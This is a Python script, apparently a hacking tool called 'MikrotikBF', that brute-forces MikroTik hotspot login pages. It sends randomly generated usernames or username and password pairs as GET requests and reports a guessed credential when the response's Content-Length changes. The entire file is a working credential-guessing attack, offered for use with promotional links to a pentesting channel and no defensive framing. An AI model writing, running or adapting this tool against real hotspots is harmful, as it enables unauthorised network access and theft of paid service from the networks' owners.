import requests
from time import sleep
from random import sample

red = '\033[1;31m'
green = '\033[2;32m'
blue = '\033[2;36m'
white = '\033[1;37m'
yellow = '\033[1;33m'
purple = '\033[2;35m'

def char_set(t):
    c = input(f'''
    {yellow} Choose the characters of the {t} :{white}
     1) only numbers.
     2) only letters.
     3) both numbers & letters.
     >>> ''')
    if c == '1':
        characters = "1234567890"
    elif c == '2':
        characters = "abcdefghijklmnopqrstuvwxyz"
    elif c == '3':
        characters = "1234567890abcdefghijklmnopqrstuvwxyz"
    else:
        print(f"{red}Invalid choice.")
        exit()
    return characters

def text(string):
    for str in string:
        print(str, end="", flush=True)
        sleep(0.03)

text(f'''{green}###############################
{yellow}MikrotikBF v1.0
{purple}Developer : Dark Levi
{blue}Telegram : https://t.me/pentesting_lab
{red}YouTube : https://youtube.com/@darklevi7
{yellow}Blogger : https://darklevi7.blogspot.com
{green}###############################\n
''')

print(f'''{green}

╭━╮╭━┳━━╮╭━━━╮
┃┃╰╯┃┃╭╮┃┃╭━━╯
┃╭╮╭╮┃╰╯╰┫╰━━╮
┃┃┃┃┃┃╭━╮┃╭━━╯
┃┃┃┃┃┃╰━╯┃┃
╰╯╰╯╰┻━━━┻╯

\n''')

login_link = input(f'{white} Enter login page link {green}ex.(http://a.com/login) : ')
print(f"{yellow} Connecting..")
try:
	r = requests.get(login_link)
	sleep(1)
except:
    print(f'{red}Connection Error !')
    exit()

network_type = input(f'''
{yellow} Choose Network Type :{white}
 1) only username.
 2) username and hidden password.
 3) username and password.
 >>> ''')
if network_type == '1' or network_type == '2':
    characters = char_set('card')
    length = int(input(' Enter the length of the card : '))
    beginning = input(f' Enter the beginning of the card {green}(press Enter if there\'s not) : ')
    ending = input(f'{white} Enter the ending of the card {green}(press Enter if there\'s not) : ')
    length = length - (len(beginning) + len(ending))
elif network_type == '3':
    user_characters = char_set('username')
    length_of_user = int(input(' Enter the length of the username : '))
    beginning_of_user = input(f' Enter the beginning of the username {green}(press Enter if there\'s not) : ')
    ending_of_user = input(f'{white} Enter the ending of the username {green}(press Enter if there\'s not) : ')

    pass_characters = char_set('password')
    length_of_pass = int(input(' Enter the length of the password : '))
    beginning_of_pass = input(f'{white} Enter the beginning of the password {green}(press Enter if there\'s not) : ')
    ending_of_pass = input(f'{white} Enter the ending of the password {green}(press Enter if there\'s not) : ')

    length_of_user = length_of_user - (len(beginning_of_user) + len(ending_of_user))
    length_of_pass = length_of_pass - (len(beginning_of_pass) + len(ending_of_pass))
else:
    print(f"{red}Invalid choice.")
    exit()

count = int(input(f'{white} Enter number of attempts : '))
        
s = []                
for i in range(1, count+1):
    if network_type == '1':
        rand_chars = "".join(sample(characters, length))
        last_char = beginning+rand_chars+ending
        result = login_link+'?username='+last_char
        r = requests.get(result)
        sleep(0.5)
        if r.status_code == 200:
            print(purple+last_char)
            print(r.headers['Content-Length'])
        else:
            print(f'{red}Connection Error!')
            break

    elif network_type == '2':
        rand_chars = "".join(sample(characters, length))
        last_char = beginning+rand_chars+ending
        result = login_link+'?username='+last_char+'&password='+last_char
        r = requests.get(result)
        sleep(0.5)
        if r.status_code == 200:
            print(purple+last_char)
        else:
            print(f'{red}Connection Error!')
            break

    else:
        user_rand_chars = "".join(sample(user_characters, length_of_user))
        pass_rand_chars = "".join(sample(pass_characters, length_of_pass))
        user_last_char = beginning_of_user+user_rand_chars+ending_of_user
        pass_last_char = beginning_of_pass + pass_rand_chars + ending_of_pass
        result = login_link+'?username='+user_last_char+'&password='+pass_last_char
        r = requests.get(result)
        sleep(0.5)
        if r.status_code == 200:
            print(f"{purple} Username {user_last_char} {blue} Password {pass_last_char}")
        else:
            print(f'{red}Connection Error!')
            break
            
    f =  r.headers['Content-Length']
    if f in s and s != []:
        s.append(r.headers['Content-Length'])
    elif f not in s and s == []:
    	s.append(r.headers['Content-Length'])
    else:
        if network_type == '3':
        	print(f'{green}found username {user_last_char} and password {pass_last_char}')
        else:
        	print(f'{green}found {last_char}')
        exit()


